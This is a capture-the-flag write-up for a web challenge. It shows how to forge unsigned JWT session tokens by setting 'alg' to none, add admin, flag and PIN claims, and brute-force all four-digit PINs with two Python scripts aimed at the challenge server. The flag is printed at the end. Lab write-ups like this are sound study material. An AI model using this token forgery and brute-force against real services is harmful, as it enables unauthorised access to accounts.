# you-can-trust-me
![Screenshot 2024-03-24 221936](https://github.com/alexsandusf/CTFWriteups/assets/162010016/ae31f1b0-b80e-43be-88d2-764848ea2abd)




#  Start
![image](https://github.com/alexsandusf/CTFWriteups/assets/162010016/e72d5b6a-b4a0-4b56-a108-76acee8d9092)


# Solution
First make a GET request to the target using BurpSuite, the response will give us a JWT token.

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYW5vbnltb3VzIn0.WC3mWgv2xrWOwgr1RHRxGlfZRPuNl6fycM9VhLbXMxA

Next decode the token I used: https://www.gavinjl.me/edit-jwt-online-alg-none/

# Decoded Token

{"alg":"HS256","typ":"JWT"}

{"user":"anonymous"}

# Modify the token

We can try setting the "alg" to none and "user" to "admin"

This will still not work as we need more information

![image](https://github.com/alexsandusf/CTFWriteups/assets/162010016/7434897e-e229-4b83-9e04-f1547a66e0cb)

Using dirb we can fuzz untill we reach the /docs which will give us a hint for the challenge

![image](https://github.com/alexsandusf/CTFWriteups/assets/162010016/eafb7d63-81ae-4936-8665-662ea2a10874)

We can try adding the is_admin key to the JWT token

{"user":"anonymous","is_admin": True}

# Missing Flag

Next we just edit the JWT token again to add a flag value

{"user":"anonymous","is_admin": True,"flag":"a"}

# Missing Pin

Next it returns Missing Pin so, we add a pin value

{"user":"anonymous","is_admin": True,"flag":"a","pin":"1234"}

# Pin is invalid (hint)use your phone pin first 4

The next step is just to brute force the pins untill we get the correct one

```python3

import jwt

# Define the secret key (you can change this as needed)
secret_key = ""

# Define the payload template
payload_template = {
    "user": "admin",
    "is_admin": True,
    "flag": "a",
    "pin": None
}

# Define the character set for the PIN (you may need to adjust this)
charset = "0123456789"

# Generate JWT tokens with PINs from 0000 to 9999
jwt_tokens = []
for pin in range(10000):
    payload_template["pin"] = f"{pin:04d}"
    token = jwt.encode(payload_template, secret_key, algorithm="none").encode('utf-8')
    jwt_tokens.append(token)

# Write JWT tokens to a text file
with open("jwt_tokens.txt", "w") as file:
    for token in jwt_tokens:
        file.write(token.decode('utf-8') + "\n")






# Print all JWT tokens
for token in jwt_tokens:
    print(token)

```

This will get us a text file with all of our keys needed so we can bruteforce the solution

# Gettting Flag


```python3

import requests

def get_next_cookie_from_file(file_path):
    """Read cookies from a file and return the next cookie."""
    with open(file_path, 'r') as file:
        cookies = file.readlines()
    get_next_cookie_from_file.index = getattr(get_next_cookie_from_file, 'index', 0)
    if get_next_cookie_from_file.index >= len(cookies):
        get_next_cookie_from_file.index = 0
    cookie = cookies[get_next_cookie_from_file.index].strip()  # Strip to remove trailing newline characters
    get_next_cookie_from_file.index += 1
    print(cookie)
    return cookie

def send_get_request(cookie_file_path):
    # Define the URL and headers
    url = 'http://34.89.210.219:31823/'
    headers = {
        'Host': '34.89.210.219:31823',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cookie': 'sessionKey=' + get_next_cookie_from_file(cookie_file_path),  # Get next cookie from file
        'Connection': 'close'
    }

    # Send the GET request
    response = requests.get(url, headers=headers)

    # Print the response
    print(response.text)

# Provide the path to the file containing cookies
cookie_file_path = 'jwt_tokens.txt'

# Send the GET request with the next cookie from the file
while(1):
  send_get_request(cookie_file_path)

```

Using the pin 7331 we will end up getting the flag

CTF{2965f7e9fcc77fff2bd869db984df8371845d6781edb382cc34536904207a53d}
